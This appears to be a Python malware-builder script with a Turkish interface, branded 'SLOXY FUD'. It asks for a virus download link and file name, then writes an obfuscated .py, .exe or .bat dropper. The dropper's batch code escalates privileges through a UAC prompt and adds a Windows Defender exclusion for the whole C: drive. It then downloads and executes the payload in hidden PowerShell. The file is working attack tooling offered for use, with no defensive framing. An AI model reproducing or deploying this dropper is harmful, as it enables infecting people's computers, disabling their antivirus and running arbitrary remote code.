from colorama import init, Fore
from os import system

pycode = '''
import os

h = open("client.bat","w")
h.write("""
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

powershell -w hidden -c Add-MpPreference -ExclusionPath "C:";Start-BitsTransfer -Source "dosyalinki" -Destination "C:\dosyaismi";Invoke-expression "C:\dosyaismi"
""")


h.close()
os.system("start client.bat")
'''

batcode = '''
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

powershell -w hidden -c Add-MpPreference -ExclusionPath "C:";Start-BitsTransfer -Source "dosyalinki" -Destination "C:\dosyaismi";Invoke-expression "C:\dosyaismi"
'''

text = """
 $$$$$$\  $$\       $$$$$$\  $$\   $$\ $$\     $$\       $$$$$$$$\ $$\   $$\ $$$$$$$\  
$$  __$$\ $$ |     $$  __$$\ $$ |  $$ |\$$\   $$  |      $$  _____|$$ |  $$ |$$  __$$\ 
$$ /  \__|$$ |     $$ /  $$ |\$$\ $$  | \$$\ $$  /       $$ |      $$ |  $$ |$$ |  $$ |
\$$$$$$\  $$ |     $$ |  $$ | \$$$$  /   \$$$$  /        $$$$$\    $$ |  $$ |$$ |  $$ |
 \____$$\ $$ |     $$ |  $$ | $$  $$<     \$$  /         $$  __|   $$ |  $$ |$$ |  $$ |
$$\   $$ |$$ |     $$ |  $$ |$$  /\$$\     $$ |          $$ |      $$ |  $$ |$$ |  $$ |
\$$$$$$  |$$$$$$$$\ $$$$$$  |$$ /  $$ |    $$ |          $$ |      \$$$$$$  |$$$$$$$  |
 \______/ \________|\______/ \__|  \__|    \__|          \__|       \______/ \_______/ 

"""

init()
print(Fore.RED)
print(text)
print(Fore.BLUE)
v = input("Virüsünüzün tek tıkla indirme kodu >> ")
print(Fore.RED)
print("--------------------------------------------------------------")
print(Fore.BLUE)
d = input("Virüsünüzün adını girin (virus.exe gibi) >> ")
print(Fore.RED)
print("--------------------------------------------------------------")
print(Fore.BLUE)
t = int(input("Dosya çıktısını seçin:\n1- .py\n2- .py to .exe\n3- .bat\n>> "))
print(Fore.RED)
print("Buildiniz oluşturuluyor...")
print("--------------------------------------------------------------")
if t == 1:
    yd = input("Oluşturmak istediğiniz dosyanın ismi (fud.py gibi) >> ")
    f = open(yd,"w")
    pyc = pycode.replace("dosyaismi",d)
    pyc = pyc.replace("dosyalinki",v)
    f.write(pyc)
    f.close()
    system(f"pyarmor obfuscate {yd}")
    print("--------------------------------------------------------------")
    print("Dosyanız dist klasörü içinde oluşturulmuştur. Denemek için virustotal atabilirsiniz.")
    system("pause")

elif t == 2:
    yd = input("Oluşturmak istediğiniz dosyanın ismi (fud.py gibi) >> ")
    f = open(yd,"w")
    pyc = pycode.replace("dosyaismi",d)
    pyc = pyc.replace("dosyalinki",v)
    f.write(pyc)
    f.close()
    system(f"pyinstaller --onefile {yd}")
    print("--------------------------------------------------------------")
    print("Dosyanız dist klasörü içinde oluşturulmuştur. Denemek için virustotal atabilirsiniz.")
    system("pause")
elif t == 3:
    yd = input("Oluşturmak istdiğiniz dosyanın ismi (fud.bat gibi) >> ")
    f = open(yd, "w")
    batc = batcode.replace("dosyaismi",d)
    batc = batc.replace("dosyalinki",v)
    f.write(batc)
    f.close()
    print("--------------------------------------------------------------")
    print("Dosyanız oluşturulmuştur. Denemek için virustotal atabilirsiniz.")
    system("pause")
